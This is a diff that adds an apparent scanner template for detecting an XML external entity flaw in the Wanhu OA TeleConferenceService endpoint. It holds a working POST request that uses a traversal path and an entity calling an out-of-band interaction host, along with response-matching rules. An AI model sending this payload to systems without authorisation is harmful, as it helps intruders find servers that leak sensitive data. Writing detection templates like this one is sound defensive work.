@@ -1,0 +1,37 @@
+id: wanhu-teleconferenceservice-xxe
+brief:
+    title: Wanhu OA TeleConferenceService Interface - XML External Entity Injection
+    by: SleepingBag945
+    level: high
+    about: There is an XXE injection vulnerability in the Wanhu OA TeleConferenceService interface. An attacker can use the vulnerability to continue XXE injection to obtain sensitive information on the server.
+    label:
+        - wanhu
+        - oa
+        - xxe
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../TeleConferenceService'
+      body: |-
+        <?xml version="1.0" encoding="UTF-8" ?>
+        <!DOCTYPE ANY [
+        <!ENTITY xxe SYSTEM "http://{{interactsh-url}}" >]>
+        <value>&xxe;</value>
+      signs:
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
+        - "on": word
+          has:
+            - <response>
+            - <retcode>
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/xml
+          in: header
+          need: all
